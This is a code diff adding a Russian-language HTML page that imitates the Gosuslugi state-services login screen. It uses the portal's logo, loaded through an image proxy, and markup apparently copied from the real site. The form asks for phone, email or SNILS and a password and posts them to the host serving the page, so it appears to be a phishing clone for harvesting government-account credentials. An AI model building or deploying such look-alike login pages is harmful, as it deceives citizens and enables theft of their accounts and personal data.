@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Главная страница</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+<link rel="stylesheet" href="./logo.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Raleway:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+<style>
+body {
+  font-family: Arial, sans-serif;
+  margin: 0;
+  padding: 30px 30px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  background-color: #e4ecfd;
+
+}
+
+.container {
+  max-width: 400px;
+  width: 100%;
+  padding: 30px;
+  background-color: #fff; /* светло-серый фон */
+  border-radius: 10px;
+  box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+  text-align: center;
+}
+
+.logo {
+  padding: 20px 0 10px 0;
+  width: 180px;
+  margin-bottom: 20px;
+}
+
+.form-group {
+  margin-bottom: 20px;
+  text-align: left;
+}
+
+.form-group input {
+  background: #f5f7fa;
+  width: 100%;
+  padding: 15px;
+  border: 1px;
+  border-radius: 5px;
+  font-size: 16px;
+  box-sizing: border-box;
+  text-align: left;
+  color: #66727f; /* темно-серый цвет текста */
+}
+
+.form-group input::placeholder {
+  color: #66727f; /* внутренняя часть серая */
+}
+
+.btn {
+  width: 100%;
+  padding: 15px;
+  border: none;
+  border-radius: 5px;
+  background-color: #0d309b;
+  color: #fff;
+  font-size: 16px;
+  cursor: pointer;
+}
+
+.btn:hover {
+  background-color: #0056b3;
+}
+
+.text-muted {
+  font-size: 12px;
+  color: #999;
+}
+.vost{
+  text-aling: left;
+}
+.top_bar{
+     text-align: center;
+}
+.top_bar input{
+    background-color: #0d309b;
+    border: none;
+    color: #FFF;
+    font-size: 16px;
+    border-radius: 8px;
+    padding: 10px;
+    margin: 0 auto;
+    margin: 10px;
+}
+.top_bar input:hover{
+    background-color: #C55656;
+}
+.2but{
+
+  padding: 10px;
+}
+.another{
+  padding: 15px;
+  color: #757575;
+}
+
+.form-container__actions-row{
+justify-content: space-between;
+display: flex;
+margin: 0;
+padding: 0;
+border: 0;
+font: inherit;
+font-size: 20px;
+}
+.form-container__actions-row_grid .form-container__actions-col{
+  width: calc(50% - 8px);
+}
+.form-container__actions-col button, .form-container__actions-col a {
+  width: 100%;
+  text-align: center;
+}
+.plain-button_light {
+  border: 2px solid #e4ecfd;
+}
+.plain-button_white, .plain-button_light {
+  padding-top: 14px;
+  padding-bottom: 14px;
+  color: #0d4cd3;
+  background: #ffffff;
+}
+.plain-button {
+font-size: 16px;
+  display: inline-block;
+  border-radius: 8px;
+  }
+</style>
+</head>
+<body>
+<div class="container">
+  <img src="https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fwww.miit.ru%2Fcabinet%2Fhello%2Fgosuslugi-logo.png&f=1&nofb=1&ipt=450ea3461c5817798751e8fa0e7ae2e94aea36aae5449ff421a8f640879539c2&ipo=images" alt="" class="logo">
+  <form method="post">
+      <div class="form-group">
+        <input type="text" id="user_input" name="user_input" placeholder="Телефон / Email / СНИЛС" required>
+      </div>
+      <div class="form-group">
+        <input type="password" id="password" name="password" placeholder="Пароль" required>
+      </div>
+    <button type="submit" class="btn">Войти</button>
+    <p class="another">Войти другим способом</p>
+
+
+
+
+    <div _ngcontent-oug-c92="" class="form-container__actions-row form-container__actions-row_grid">
+      <div _ngcontent-oug-c92="" class="form-container__actions-col">
+        <button _ngcontent-oug-c92="" tabindex="0" class="plain-button plain-button_light" aria-label="Войти по QR-коду"> QR-код </button>
+      </div><!---->
+      <div _ngcontent-oug-c92="" class="form-container__actions-col">
+        <button _ngcontent-oug-c92="" type="button" tabindex="0" class="plain-button plain-button_light" aria-label="Войти по электронной подписи"> Эл. подпись </button><!---->
+      </div>
+    </div>
+  </form>
+</div>
+</body>
+</html>
